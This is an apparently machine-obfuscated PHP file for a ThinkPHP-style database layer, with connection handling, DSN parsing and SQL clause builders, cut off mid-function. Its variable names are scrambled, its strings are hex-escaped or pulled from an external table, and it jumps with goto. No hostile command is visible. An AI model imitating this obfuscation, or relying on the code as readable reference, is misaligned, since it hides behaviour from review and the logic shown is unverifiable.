<?php
 goto B‰ñ£Œ¢; fáƒåŒŞ¹: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\150\151\156\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\75", "\156\145\161" => "\x3c\x3e", "\x67\164" => "\76", "\145\147\x74" => "\76\x3d", "\x6c\x74" => "\74", "\x65\x6c\x74" => "\x3c\75", "\156\x6f\x74\154\151\x6b\145" => "\116\117\124\40\114\x49\x4b\105", "\x6c\x69\153\x65" => "\x4c\111\113\x45", "\151\x6e" => "\111\116", "\x6e\x6f\x74\x69\156" => "\116\x4f\x54\40\111\116", "\x6e\x6f\164\40\151\x6e" => "\x4e\117\x54\40\x49\x4e", "\x62\x65\164\x77\145\145\156" => "\x42\105\x54\x57\105\x45\x4e", "\156\157\164\142\145\164\x77\145\145\156" => "\116\x4f\x54\40\x42\105\124\x57\x45\105\x4e", "\x6e\x6f\164\40\x62\x65\x74\x77\x65\145\156" => "\116\x4f\124\x20\x42\105\124\x57\x45\105\x4e"); protected $selectSql = "\123\x45\x4c\105\103\124\45\x44\x49\x53\124\x49\x4e\x43\124\x25\x20\x25\x46\x49\105\114\104\45\40\x46\x52\x4f\x4d\x20\x25\x54\x41\x42\114\x45\45\x25\112\117\x49\x4e\45\45\127\110\105\122\x45\x25\x25\107\x52\117\125\120\45\45\x48\101\126\x49\116\x47\x25\45\x4f\x52\104\x45\122\45\x25\x4c\111\x4d\x49\x54\x25\40\x25\125\x4e\111\x4f\x4e\45\x25\x43\x4f\x4d\115\x45\x4e\124\x25"; protected $bind = array(); public static function getInstance() { $åòó‹”Î = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[¹Û¹Æ€][957], $åòó‹”Î); } public function factory($¶ÏÙ üØ = '') { $Ô¿ı‰Ö™ =& $_SERVER[¹Û¹Æ€]; $¶ÏÙ üØ = $this->parseConfig($¶ÏÙ üØ); if (empty($¶ÏÙ üØ[$Ô¿ı‰Ö™[958]])) { think_exception(think_lang($Ô¿ı‰Ö™[959])); } $this->dbType = ucwords(strtolower($¶ÏÙ üØ[$Ô¿ı‰Ö™[958]])); $ğå˜¬ßÚ = $Ô¿ı‰Ö™[960] . $this->dbType; if (class_exists($ğå˜¬ßÚ)) { $¶ßÎï×¼ = new $ğå˜¬ßÚ($¶ÏÙ üØ); if ($Ô¿ı‰Ö™[961] != strtolower($¶ÏÙ üØ[$Ô¿ı‰Ö™[958]])) { $¶ßÎï×¼->dbType = strtoupper($this->dbType); } else { $¶ßÎï×¼->dbType = $this->_getDsnType($¶ÏÙ üØ[$Ô¿ı‰Ö™[913]]); } } else { think_exception(think_lang($Ô¿ı‰Ö™[962]) . $Ô¿ı‰Ö™[963] . $ğå˜¬ßÚ); } return $¶ßÎï×¼; } public function __call($Ÿ¡­‚Ã¼, $éé–åĞ³) { if (method_exists($this, $Ÿ¡­‚Ã¼)) { return call_user_func_array(array($this, $Ÿ¡­‚Ã¼), $éé–åĞ³); } } protected function _getDsnType($¿¯£æÇ) { $×È‹¤Ğ¹ = explode($_SERVER[¹Û¹Æ€][4], $¿¯£æÇ); $µ¤Ğ–¶® = strtoupper(trim($×È‹¤Ğ¹[0])); return $µ¤Ğ–¶®; } private function parseConfig($ò¯ ¿ç” = '') { $†Óé™Šü =& $_SERVER[¹Û¹Æ€]; if (!empty($ò¯ ¿ç”) && is_string($ò¯ ¿ç”)) { $ò¯ ¿ç” = $this->parseDSN($ò¯ ¿ç”); } elseif (is_array($ò¯ ¿ç”)) { $ò¯ ¿ç” = array_change_key_case($ò¯ ¿ç”); $ò¯ ¿ç” = array($†Óé™Šü[958] => $ò¯ ¿ç”[$†Óé™Šü[964]], $†Óé™Šü[885] => $ò¯ ¿ç”[$†Óé™Šü[965]], $†Óé™Šü[886] => $ò¯ ¿ç”[$†Óé™Šü[966]], $†Óé™Šü[883] => $ò¯ ¿ç”[$†Óé™Šü[967]], $†Óé™Šü[884] => $ò¯ ¿ç”[$†Óé™Šü[968]], $†Óé™Šü[31] => $ò¯ ¿ç”[$†Óé™Šü[969]], $†Óé™Šü[913] => $ò¯ ¿ç”[$†Óé™Šü[970]], $†Óé™Šü[27] => isset($ò¯ ¿ç”[$†Óé™Šü[971]]) ? $ò¯ ¿ç”[$†Óé™Šü[971]] : array()); } elseif (empty($ò¯ ¿ç”)) { if (think_config($†Óé™Šü[972]) && $†Óé™Šü[961] != strtolower(think_config($†Óé™Šü[973]))) { $ò¯ ¿ç” = $this->parseDSN(think_config($†Óé™Šü[972])); } else { $ò¯ ¿ç” = array($†Óé™Šü[958] => think_config($†Óé™Šü[973]), $†Óé™Šü[885] => think_config($†Óé™Šü[974]), $†Óé™Šü[886] => think_config($†Óé™Šü[975]), $†Óé™Šü[883] => think_config($†Óé™Šü[976]), $†Óé™Šü[884] => think_config($†Óé™Šü[977]), $†Óé™Šü[31] => think_config($†Óé™Šü[255]), $†Óé™Šü[913] => think_config($†Óé™Šü[972]), $†Óé™Šü[27] => think_config($†Óé™Šü[978])); } } return $ò¯ ¿ç”; } protected function initConnect($©åÚÓ‰å = true) { if (1 == think_config($_SERVER[¹Û¹Æ€][32])) { $this->_linkID = $this->multiConnect($©åÚÓ‰å); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $ÓŒ«¸É => $Î·ÀöéÑ) { $this->_linkID = $Î·ÀöéÑ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($û²¦Ğ¡ö = false) { $ €òÅ„ =& $_SERVER[¹Û¹Æ€]; static $‡ÍÌãÎø = array(); static $–øæïé¡ = -1; if (empty($‡ÍÌãÎø)) { foreach ($this->config as $ü±¶ïôÕ => $Üå¡¡È) { $‡ÍÌãÎø[$ü±¶ïôÕ] = explode($ €òÅ„[60], $Üå¡¡È); } } if (think_config($ €òÅ„[979])) { if ($û²¦Ğ¡ö || think_config($ €òÅ„[404]) === !0) { $Œ•œÌÅü = floor(mt_rand(0, think_config($ €òÅ„[980]) - 1)); $–øæïé¡ = $Œ•œÌÅü; } else { if (is_numeric(think_config($ €òÅ„[981]))) { $Œ•œÌÅü = think_config($ €òÅ„[981]); } else { $Œ•œÌÅü = floor(mt_rand(think_config($ €òÅ„[980]), count($‡ÍÌãÎø[$ €òÅ„[883]]) - 1)); } } } else { $Œ•œÌÅü = floor(mt_rand(0, count($‡ÍÌãÎø[$ €òÅ„[883]]) - 1)); $–øæïé¡ = $Œ•œÌÅü; } $Œ•œÌÅü = $–øæïé¡ !== -1 ? $–øæïé¡ : $Œ•œÌÅü; $é¸àà…™ = array($ €òÅ„[885] => isset($‡ÍÌãÎø[$ €òÅ„[885]][$Œ•œÌÅü]) ? $‡ÍÌãÎø[$ €òÅ„[885]][$Œ•œÌÅü] : $‡ÍÌãÎø[$ €òÅ„[885]][0], $ €òÅ„[886] => isset($‡ÍÌãÎø[$ €òÅ„[886]][$Œ•œÌÅü]) ? $‡ÍÌãÎø[$ €òÅ„[886]][$Œ•œÌÅü] : $‡ÍÌãÎø[$ €òÅ„[886]][0], $ €òÅ„[883] => isset($‡ÍÌãÎø[$ €òÅ„[883]][$Œ•œÌÅü]) ? $‡ÍÌãÎø[$ €òÅ„[883]][$Œ•œÌÅü] : $‡ÍÌãÎø[$ €òÅ„[883]][0], $ €òÅ„[884] => isset($‡ÍÌãÎø[$ €òÅ„[884]][$Œ•œÌÅü]) ? $‡ÍÌãÎø[$ €òÅ„[884]][$Œ•œÌÅü] : $‡ÍÌãÎø[$ €òÅ„[884]][0], $ €òÅ„[31] => isset($‡ÍÌãÎø[$ €òÅ„[31]][$Œ•œÌÅü]) ? $‡ÍÌãÎø[$ €òÅ„[31]][$Œ•œÌÅü] : $‡ÍÌãÎø[$ €òÅ„[31]][0], $ €òÅ„[913] => isset($‡ÍÌãÎø[$ €òÅ„[913]][$Œ•œÌÅü]) ? $‡ÍÌãÎø[$ €òÅ„[913]][$Œ•œÌÅü] : $‡ÍÌãÎø[$ €òÅ„[913]][0], $ €òÅ„[27] => isset($‡ÍÌãÎø[$ €òÅ„[27]][$Œ•œÌÅü]) ? $‡ÍÌãÎø[$ €òÅ„[27]][$Œ•œÌÅü] : $‡ÍÌãÎø[$ €òÅ„[27]][0]); return $this->connect($é¸àà…™, $Œ•œÌÅü); } public function parseDSN($ÀúË×‡Š) { $…Ş¡¿Ùğ =& $_SERVER[¹Û¹Æ€]; if (empty($ÀúË×‡Š)) { return !1; } $¶×‘œ—§ = parse_url($ÀúË×‡Š); if ($¶×‘œ—§[$…Ş¡¿Ùğ[190]]) { $ÙİÁËõĞ = array($…Ş¡¿Ùğ[958] => $¶×‘œ—§[$…Ş¡¿Ùğ[190]], $…Ş¡¿Ùğ[885] => isset($¶×‘œ—§[$…Ş¡¿Ùğ[609]]) ? $¶×‘œ—§[$…Ş¡¿Ùğ[609]] : $…Ş¡¿Ùğ[22], $…Ş¡¿Ùğ[886] => isset($¶×‘œ—§[$…Ş¡¿Ùğ[982]]) ? $¶×‘œ—§[$…Ş¡¿Ùğ[982]] : $…Ş¡¿Ùğ[22], $…Ş¡¿Ùğ[883] => isset($¶×‘œ—§[$…Ş¡¿Ùğ[191]]) ? $¶×‘œ—§[$…Ş¡¿Ùğ[191]] : $…Ş¡¿Ùğ[22], $…Ş¡¿Ùğ[884] => isset($¶×‘œ—§[$…Ş¡¿Ùğ[192]]) ? $¶×‘œ—§[$…Ş¡¿Ùğ[192]] : $…Ş¡¿Ùğ[22], $…Ş¡¿Ùğ[31] => isset($¶×‘œ—§[$…Ş¡¿Ùğ[94]]) ? substr($¶×‘œ—§[$…Ş¡¿Ùğ[94]], 1) : $…Ş¡¿Ùğ[22]); } else { preg_match($…Ş¡¿Ùğ[983], trim($ÀúË×‡Š), $˜¿óøï); $ÙİÁËõĞ = array($…Ş¡¿Ùğ[958] => $˜¿óøï[1], $…Ş¡¿Ùğ[885] => $˜¿óøï[2], $…Ş¡¿Ùğ[886] => $˜¿óøï[3], $…Ş¡¿Ùğ[883] => $˜¿óøï[4], $…Ş¡¿Ùğ[884] => $˜¿óøï[5], $…Ş¡¿Ùğ[31] => $˜¿óøï[6]); } $ÙİÁËõĞ[$…Ş¡¿Ùğ[913]] = $…Ş¡¿Ùğ[22]; return $ÙİÁËõĞ; } protected function debug() { $Ñ×Å©¦ß =& $_SERVER[¹Û¹Æ€]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $Ñ×Å©¦ß[984]; if (think_config($Ñ×Å©¦ß[985])) { think_status($Ñ×Å©¦ß[986]); think_trace($this->queryStr . $Ñ×Å©¦ß[987] . think_status($Ñ×Å©¦ß[34], $Ñ×Å©¦ß[986], 6) . $Ñ×Å©¦ß[988], $Ñ×Å©¦ß[22], $Ñ×Å©¦ß[989]); } } protected function parseLock($†øáŞ±† = false) { $ÁëüŸ¼Ø =& $_SERVER[¹Û¹Æ€]; if (!$†øáŞ±†) { return $ÁëüŸ¼Ø[22]; } if ($ÁëüŸ¼Ø[915] == $this->dbType) { return $ÁëüŸ¼Ø[990]; } return $ÁëüŸ¼Ø[991]; } protected function parseSet($ñ·î‚­æ) { $Û‚Û¢Ä =& $_SERVER[¹Û¹Æ€]; foreach ($ñ·î‚­æ as $äÓçàéÉ => $Ğ×ù¦™„) { if (is_array($Ğ×ù¦™„) && $Û‚Û¢Ä[306] == $Ğ×ù¦™„[0]) { $´ÊØÙˆÔ[] = $this->parseKey($äÓçàéÉ) . $Û‚Û¢Ä[881] . $Ğ×ù¦™„[1]; } elseif (is_scalar($Ğ×ù¦™„) || is_null($Ğ×ù¦™„)) { $´ÊØÙˆÔ[] = $this->parseKey($äÓçàéÉ) . $Û‚Û¢Ä[881] . $this->parseValue($Ğ×ù¦™„); } } return $Û‚Û¢Ä[992] . implode($Û‚Û¢Ä[60], $´ÊØÙˆÔ); } protected function bindParam($âµ§£€ê, $ş§Ìã€²) { $this->bind[$_SERVER[¹Û¹Æ€][4] . $âµ§£€ê] = $ş§Ìã€²; } protected function parseBind($ºÓğí–) { $ºÓğí– = array_merge($this->bind, $ºÓğí–); $this->bind = array(); return $ºÓğí–; } function parseKey(&$Ç¨«—öô, $äšœ¯‚„ = true) { if ($äšœ¯‚„) { $Ç¨«—öô = $this->parseKeyCheck($Ç¨«—öô); } return $Ç¨«—öô; } function parseKeyCheck($ÂñíğÕ¿) { $Áâ¥à‰ú =& $_SERVER[¹Û¹Æ€]; $ÂñíğÕ¿ = trim($ÂñíğÕ¿); if (!preg_match($Áâ¥à‰ú[993], $ÂñíğÕ¿)) { think_exception($Áâ¥à‰ú[994] . $ÂñíğÕ¿); } return $ÂñíğÕ¿; } protected function parseValue($°£Ñ) { $×ùÛ…É… =& $_SERVER[¹Û¹Æ€]; if (is_string($°£Ñ)) { $°£Ñ = $×ùÛ…É…[954] . $this->escapeString($°£Ñ) . $×ùÛ…É…[954]; } elseif (isset($°£Ñ[0]) && is_string($°£Ñ[0]) && strtolower($°£Ñ[0]) == $×ùÛ…É…[306]) { $°£Ñ = $this->escapeString($°£Ñ[1]); } elseif (is_array($°£Ñ)) { $°£Ñ = array_map(array($this, $×ùÛ…É…[955]), $°£Ñ); } elseif (is_bool($°£Ñ)) { $°£Ñ = $°£Ñ ? $×ùÛ…É…[98] : $×ùÛ…É…[207]; } elseif (is_null($°£Ñ)) { $°£Ñ = $×ùÛ…É…[113]; } return $°£Ñ; } protected function parseField($¨œ˜±”á) { $Å´šãß« =& $_SERVER[¹Û¹Æ€]; if (is_string($¨œ˜±”á) && strpos($¨œ˜±”á, $Å´šãß«[60])) { $¨œ˜±”á = explode($Å´šãß«[60], $¨œ˜±”á); } if (is_array($¨œ˜±”á)) { $ÚïõÚ¯ = array(); foreach ($¨œ˜±”á as $¾æ…è¢ => $Ş•Ä¶ş) { if (!is_numeric($¾æ…è¢)) { $ÚïõÚ¯[] = $this->parseKey($¾æ…è¢, !1) . $Å´šãß«[995] . $this->parseKey($Ş•Ä¶ş); } else { $ÚïõÚ¯[] = $this->parseKey($Ş•Ä¶ş); } } $©—ø×ßí = implode($Å´šãß«[60], $ÚïõÚ¯); } elseif (is_string($¨œ˜±”á) && !empty($¨œ˜±”á)) { $©—ø×ßí = $¨œ˜±”á; } else { $©—ø×ßí = $Å´šãß«[198]; } return $©—ø×ßí; } protected function parseTable($ê× ¨ä›) { $Ô¬Âì»í =& $_SERVER[¹Û¹Æ€]; if (is_array($ê× ¨ä›)) { $±ìîµô = array(); foreach ($ê× ¨ä› as $ ®ŞÔº± => $†£ËîŠ) { if (!is_numeric($ ®ŞÔº±)) { $±ìîµô[] = $this->parseKey($ ®ŞÔº±) . $Ô¬Âì»í[63] . $this->parseKey($†£ËîŠ); } else { $±ìîµô[] = $this->parseKey($ ®ŞÔº±); } } $ê× ¨ä› = $±ìîµô; } elseif (is_string($ê× ¨ä›)) { if (strstr($ê× ¨ä›, $Ô¬Âì»í[63])) { return $ê× ¨ä›; } $ê× ¨ä› = explode($Ô¬Âì»í[60], $ê× ¨ä›); array_walk($ê× ¨ä›, array($this, $Ô¬Âì»í[903])); } return $Ô¬Âì»í[897] . trim(implode($Ô¬Âì»í[996], $ê× ¨ä›), $Ô¬Âì»í[394]) . $Ô¬Âì»í[897]; } protected function parseWhere($Ü¢Š »œ) { $ó¼—¤ä„ =& $_SERVER[¹Û¹Æ€]; $¿Ú•Í¿ = $ó¼—¤ä„[22]; if (is_string($Ü¢Š »œ)) { $¿Ú•Í¿ = $Ü¢Š »œ; } else { $¢á  ş = isset($Ü¢Š »œ[$ó¼—¤ä„[997]]) ? strtoupper($Ü¢Š »œ[$ó¼—¤ä„[997]]) : $ó¼—¤ä„[22]; if (in_array($¢á  ş, array($ó¼—¤ä„[998], $ó¼—¤ä„[999], $ó¼—¤ä„[1000]))) { $¢á  ş = $ó¼—¤ä„[63] . $¢á  ş . $ó¼—¤ä„[63]; unset($Ü¢Š »œ[$ó¼—¤ä„[997]]); } else { $¢á  ş = $ó¼—¤ä„[1001]; } foreach ($Ü¢Š »œ as $šŒÃ×Ì => $¿Ï¤˜ğü) { $¿Ú•Í¿ .= $ó¼—¤ä„[286]; if (is_numeric($šŒÃ×Ì)) { $šŒÃ×Ì = $ó¼—¤ä„[1002]; } if (0 === strpos($šŒÃ×Ì, $ó¼—¤ä„[21])) { $¿Ú•Í¿ .= $this->parseThinkWhere($šŒÃ×Ì, $¿Ï¤˜ğü); } else { if (!preg_match($ó¼—¤ä„[1003], trim($šŒÃ×Ì))) { think_exception(think_lang($ó¼—¤ä„[1004]) . $ó¼—¤ä„[4] . $šŒÃ×Ì); } $Š”º = is_array($¿Ï¤˜ğü) && isset($¿Ï¤˜ğü[$ó¼—¤ä„[1005]]); $šŒÃ×Ì = trim($šŒÃ×Ì); if (strpos($šŒÃ×Ì, $ó¼—¤ä„[292])) { $Ğ¾„Šï£ = explode($ó¼—¤ä„[292], $šŒÃ×Ì); $ˆŸÂú¬Õ = array(); foreach ($Ğ¾„Šï£ as $éşïÄ¾ => $ò‚†ÙÉ) { $ª–°çò = $Š”º ? $¿Ï¤˜ğü[$éşïÄ¾] : $¿Ï¤˜ğü; $ˆŸÂú¬Õ[] = $ó¼—¤ä„[269] . $this->parseWhereItem($this->parseKey($ò‚†ÙÉ), $ª–°çò) . $ó¼—¤ä„[902]; } $¿Ú•Í¿ .= implode($ó¼—¤ä„[1006], $ˆŸÂú¬Õ); } elseif (strpos($šŒÃ×Ì, $ó¼—¤ä„[293])) { $Ğ¾„Šï£ = explode($ó¼—¤ä„[293], $šŒÃ×Ì); $ˆŸÂú¬Õ = array(); foreach ($Ğ¾„Šï£ as $éşïÄ¾ => $ò‚†ÙÉ) { $ª–°çò = $Š”º ? $¿Ï¤˜ğü[$éşïÄ¾] : $¿Ï¤˜ğü; $ˆŸÂú¬Õ[] = $ó¼—¤ä„[269] . $this->parseWhereItem($this->parseKey($ò‚†ÙÉ), $ª–°çò) . $ó¼—¤ä„[902]; } $¿Ú•Í¿ .= implode($ó¼—¤ä„[1001], $ˆŸÂú¬Õ); } else { $¿Ú•Í¿ .= $this->parseWhereItem($this->parseKey($šŒÃ×Ì), $¿Ï¤˜ğü); } } $¿Ú•Í¿ .= $ó¼—¤ä„[287] . $¢á  ş; } $¿Ú•Í¿ = substr($¿Ú•Í¿, 0, -strlen($¢á  ş)); } return empty($¿Ú•Í¿) ? $ó¼—¤ä„[22] : $ó¼—¤ä„[1007] . $¿Ú•Í¿; } protected function parseWhereItem($É¼ÁÃÖÌ, $õ•—ä±Ü) { $ö—øñ¢­ =& $_SERVER[¹Û¹Æ€]; $ğ³Şİ¢Â = $ö—øñ¢­[22]; if (is_array($õ•—ä±Ü)) { if (is_string($õ•—ä±Ü[0])) { $°³å‰˜ = strtolower($õ•—ä±Ü[0]); if (in_array($õ•—ä±Ü[0], array($ö—øñ¢­[881], $ö—øñ¢­[1008], $ö—øñ¢­[1009], $ö—øñ¢­[1010], $ö—øñ¢­[1011], $ö—øñ¢­[1012]))) { $ğ³Şİ¢Â .= $É¼ÁÃÖÌ . $ö—øñ¢­[63] . $õ•—ä±Ü[0] . $ö—øñ¢­[63] . $this->parseValue($õ•—ä±Ü[1]); } elseif (preg_match($ö—øñ¢­[1013], $õ•—ä±Ü[0])) { $ğ³Şİ¢Â .= $É¼ÁÃÖÌ . $ö—øñ¢­[63] . $this->exp[$°³å‰˜] . $ö—øñ¢­[63] . $this->parseValue($õ•—ä±Ü[1]); } elseif (preg_match($ö—øñ¢­[1014], $õ•—ä±Ü[0])) { if (is_array($õ•—ä±Ü[1])) { $®ßû½ Ë = isset($õ•—ä±Ü[2]) ? strtoupper($õ•—ä±Ü[2]) : $ö—øñ¢­[999]; if (in_array($®ßû½ Ë, array($ö—øñ¢­[998], $ö—øñ¢­[999], $ö—øñ¢­[1000]))) { $µåëÀœÊ = array(); foreach ($õ•—ä±Ü[1] as $îáğÆ•‘) { $µåëÀœÊ[] = $É¼ÁÃÖÌ . $ö—øñ¢­[63] . $this->exp[$°³å‰˜] . $ö—øñ¢­[63] . $this->parseValue($îáğÆ•‘); } $ğ³Şİ¢Â .= $ö—øñ¢­[269] . implode($ö—øñ¢­[63] . $®ßû½ Ë . $ö—øñ¢­[63], $µåëÀœÊ) . $ö—øñ¢­[902]; } } else { $ğ³Şİ¢Â .= $É¼ÁÃÖÌ . $ö—øñ¢­[63] . $this->exp[$°³å‰˜] . $ö—øñ¢­[63] . $this->parseValue($õ•—ä±Ü[1]); } } elseif ($ö—øñ¢­[306] == $°³å‰˜) { $ğ³Şİ¢Â .= $ö—øñ¢­[900] . $É¼ÁÃÖÌ . $ö—øñ¢­[63] . $õ•—ä±Ü[1] . $ö—øñ¢­[1015]; } elseif (preg_match($ö—øñ¢­[1016], $õ•—ä±Ü[0])) { $ğ³Şİ¢Â .= $õ•—ä±Ü[0]; } elseif (preg_match($ö—øñ¢­[1017], $õ•—ä±Ü[0])) { if (isset($õ•—ä±Ü[2]) && $ö—øñ¢­[306] == $õ•—ä±Ü[2]) { $ğ³Şİ¢Â .= $É¼ÁÃÖÌ . $ö—øñ¢­[63] . $this->exp[$°³å‰˜] . $ö—øñ¢­[63] . $õ•—ä±Ü[1]; } else { if (is_string($õ•—ä±Ü[1])) { $õ•—ä±Ü[1] = explode($ö—øñ¢­[60], $õ•—ä±Ü[1]); } $·”ãù‹ = implode($ö—øñ¢­[60], $this->parseValue($õ•—ä±Ü[1])); $ğ³Şİ¢Â .= $É¼ÁÃÖÌ . $ö—øñ¢­[63] . $this->exp[$°³å‰˜] . $ö—øñ¢­[900] . $·”ãù‹ . $ö—øñ¢­[902]; } } elseif (preg_match($ö—øñ¢­[1018], $õ•—ä±Ü[0])) { $ÛÂ½ôï = is_string($õ•—ä±Ü[1]) ? explode($ö—øñ¢­[60], $õ•—ä±Ü[1]) : $õ•—ä±Ü[1]; $ğ³Şİ¢Â .= $ö—øñ¢­[900] . $É¼ÁÃÖÌ . $ö—øñ¢­[63] . $this->exp[$°³å‰˜] . $ö—øñ¢­[63] . $this->parseValue($ÛÂ½ôï[0]) . $ö—øñ¢­[1001] . $this->parseValue($ÛÂ½ôï[1]) . $ö—øñ¢­[287]; } else { think_exception(think_lang($ö—øñ¢­[1004]) . $ö—øñ¢­[4] . $õ•—ä±Ü[0]); } } else { $ÁĞ€èÆ = count($õ•—ä±Ü); $äÚ–ë¾ƒ = $ö—øñ¢­[22]; if (is_string($õ•—ä±Ü[$ÁĞ€èÆ - 1])) { $äÚ–ë¾ƒ = isset($õ•—ä±Ü[$ÁĞ€èÆ - 1]) ? strtoupper($õ•—ä±Ü[$ÁĞ€èÆ - 1]) : $ö—øñ¢­[22]; if (in_array($äÚ–ë¾ƒ, array($ö—øñ¢­[998], $ö—øñ¢­[999], $ö—øñ¢­[1000]))) { $ÁĞ€èÆ = $ÁĞ€èÆ - 1; } } else { $äÚ–ë¾ƒ = $ö—øñ¢­[998]; } for ($²ïì = 0; $²ïì < $ÁĞ€èÆ; $²ïì++) { $ÛÂ½ôï = is_array($õ•—ä±Ü[$²ïì]) ? $õ•—ä±Ü[$²ïì][1] : $õ•—ä±Ü[$²ïì]; if ($ö—øñ¢­[306] == strtolower($õ•—ä±Ü[$²ïì][0])) { $ğ³Şİ¢Â .= $ö—øñ¢­[269] . $É¼ÁÃÖÌ . $ö—øñ¢­[63] . $ÛÂ½ôï . $ö—øñ¢­[1015] . $äÚ–ë¾ƒ . $ö—øñ¢­[63]; } else { $Éë›êµß = is_array($õ•—ä±Ü[$²ïì]) ? $this->exp[strtolower($õ•—ä±Ü[$²ïì][0])] : $ö—øñ¢­[881]; if (!$Éë›êµß && is_array($õ•—ä±Ü[$²ïì]) && in_array($õ•—ä±Ü[$²ïì][0], array($ö—øñ¢­[881], $ö—øñ¢­[1008], $ö—øñ¢­[1009], $ö—øñ¢­[1010], $ö—øñ¢­[1011], $ö—øñ¢­[1012]))) { $Éë›êµß = $õ•—ä±Ü[$²ïì][0]; } $ğ³Şİ¢Â .= $ö—øñ¢­[269] . $É¼ÁÃÖÌ . $ö—øñ¢­[63] . $Éë›êµß . $ö—øñ¢­[63] . $this->parseValue($ÛÂ½ôï) . $ö—øñ¢­[1015] . $äÚ–ë¾ƒ . $ö—øñ¢­[63]; } } $ğ³Şİ¢Â = substr($ğ³Şİ¢Â, 0, -4); } } else { $ğ³Şİ¢Â .= $É¼ÁÃÖÌ . $ö—øñ¢­[1019] . $this->parseValue($õ•—ä±Ü); } return $ğ³Şİ¢Â; } protected function parseThinkWhere($©ª–’ğÃ, $Íõ£ì•æ) { $ÑÑ¤¨·è =& $_SERVER[¹Û¹Æ€]; $´³òã£ = $ÑÑ¤¨·è[22]; switch ($©ª–’ğÃ) { case $ÑÑ¤¨·è[361]: $´³òã£ = $Íõ£ì•æ; break; case $ÑÑ¤¨·è[1002]: $´³òã£ = is_string($Íõ£ì•æ) ? $Íõ£ì•æ : substr($this->parseWhere($Íõ£ì•æ), 6); break; case $ÑÑ¤¨·è[1020]: parse_str($Íõ£ì•æ, $úÊé¾àÌ); if (isset($úÊé¾àÌ[$ÑÑ¤¨·è[997]])) { $Ò²—«é¢ = $ÑÑ¤¨·è[63] . strtoupper($úÊé¾àÌ[$ÑÑ¤¨·è[997]]) . $ÑÑ¤¨·è[63]; unset($úÊé¾àÌ[$ÑÑ¤¨·è[997]]); } else { $Ò²—«é¢ = $ÑÑ¤¨·è[1001]; } $¬º…‘›» = array(); foreach ($úÊé¾àÌ as $ÒÓµŸ¯§ => $ğú¦·Æ) { $¬º…‘›»[] = $this->parseKey($ÒÓµŸ¯§) . $ÑÑ¤¨·è[1019] . $this->parseValue($ğú¦·Æ); } $´³òã£ = implode($Ò²—«é¢, $¬º…‘›»); break; } return $´³òã£; } protected function parseLimit($Ôüò—–Ğ) { $Æ˜Š–šØ =& $_SERVER[¹Û¹Æ€]; return !empty($Ôüò—–Ğ) ? $Æ˜Š–šØ[61] . $Ôüò—–Ğ . $Æ˜Š–šØ[63] : $Æ˜Š–šØ[22]; } protected function parseJoin($äôµÖõ) { $°¸Ê¡µ =& $_SERVER[¹Û¹Æ€]; $ÖÊş—Á = $°¸Ê¡µ[22]; if (!empty($äôµÖõ)) { if (is_array($äôµÖõ)) { foreach ($äôµÖõ as $ÒÏé¼Ûã => $öïõš×è) { if (!1 !== stripos($öïõš×è, $°¸Ê¡µ[1021])) { $ÖÊş—Á .= $°¸Ê¡µ[63] . $öïõš×è; } else { $ÖÊş—Á .= $°¸Ê¡µ[1022] . $öïõš×è; } } } else { $ÖÊş—Á .= $°¸Ê¡µ[1022] . $äôµÖõ; } } $ÖÊş—Á = preg_replace($°¸Ê¡µ[1023], think_config($°¸Ê¡µ[927]) . $°¸Ê¡µ[1024], $ÖÊş—Á); return $ÖÊş—Á; } protected function parseOrder($’ĞßÀœ„) { $õ‰çûÊÚ =& $_SERVER[¹Û¹Æ€]; if (is_array($’ĞßÀœ„)) { $ªÚ„›«¯ = array(); foreach ($’ĞßÀœ„ as $Â«õ’âû => $Éª¼“æ») { if (is_numeric($Â«õ’âû)) { $ªÚ„›«¯[] = $this->parseKey($Éª¼“æ»); } else { $Éª¼“æ» = in_array(strtoupper(trim($Éª¼“æ»)), array($õ‰çûÊÚ[1025], $õ‰çûÊÚ[1026])) ? $õ‰çûÊÚ[63] . $Éª¼“æ» : $õ‰çûÊÚ[22]; if (preg_match($õ‰çûÊÚ[1027], $Â«õ’âû)) { $ªÚ„›«¯[] = $this->parseKey($Â«õ’âû) . $Éª¼“æ»; } else { think_exception($õ‰çûÊÚ[1028] . $Â«õ’âû); } } } $’ĞßÀœ„ = implode($õ‰çûÊÚ[60], $ªÚ„›«¯); } return !empty($’ĞßÀœ„) ? $õ‰çûÊÚ[1029] . $’ĞßÀœ„ : $õ‰çûÊÚ[22]; } protected function parseGroup($¦ÃÅÓ¦°) { $¿Š‚‘Ü =& $_SERVER[¹Û¹Æ€]; return !empty($¦ÃÅÓ¦°) ? $¿Š‚‘Ü[1030] . $¦ÃÅÓ¦° : $¿Š‚‘Ü[22]; } protected function parseHaving($¨Ø¡ù ¶) { $€ø«ŞÖÇ =& $_SERVER[¹Û¹Æ€]; return !empty($¨Ø¡ù ¶) ? $€ø«ŞÖÇ[1031] . $¨Ø¡ù ¶ : $€ø«ŞÖÇ[22]; } protected function parseComment($£íÑ®¸š) { $Óíû¬èÁ =& $_SERVER[¹Û¹Æ€]; return !empty($£íÑ®¸š) ? $Óíû¬èÁ[1032] . $£íÑ®¸š . $Óíû¬èÁ[1033] : $Óíû¬èÁ[22]; } protected function parseDistinct($©âŸÚ) { $«±Ÿ¯Ï¢ =& $_SERVER[¹Û¹Æ€]; return !empty($©âŸÚ) ? $«±Ÿ¯Ï¢[1034] : $«±Ÿ¯Ï¢[22]; } protected function parseUnion($³¡Éî­») { $ù Ã›«² =& $_SERVER[¹Û¹Æ€]; if (empty($³¡Éî­»)) { return $ù Ã›«²[22]; } if (isset($³¡Éî­»[$ù Ã›«²[357]])) { $ê Î¬Â¢ = $ù Ã›«²[1035]; unset($³¡Éî­»[$ù Ã›«²[357]]); } else { $ê Î¬Â¢ = $ù Ã›«²[1036]; } foreach ($³¡Éî­» as $ƒÀƒ…¤) { $«Ö‘Å­É[] = $ê Î¬Â¢ . (is_array($ƒÀƒ…¤) 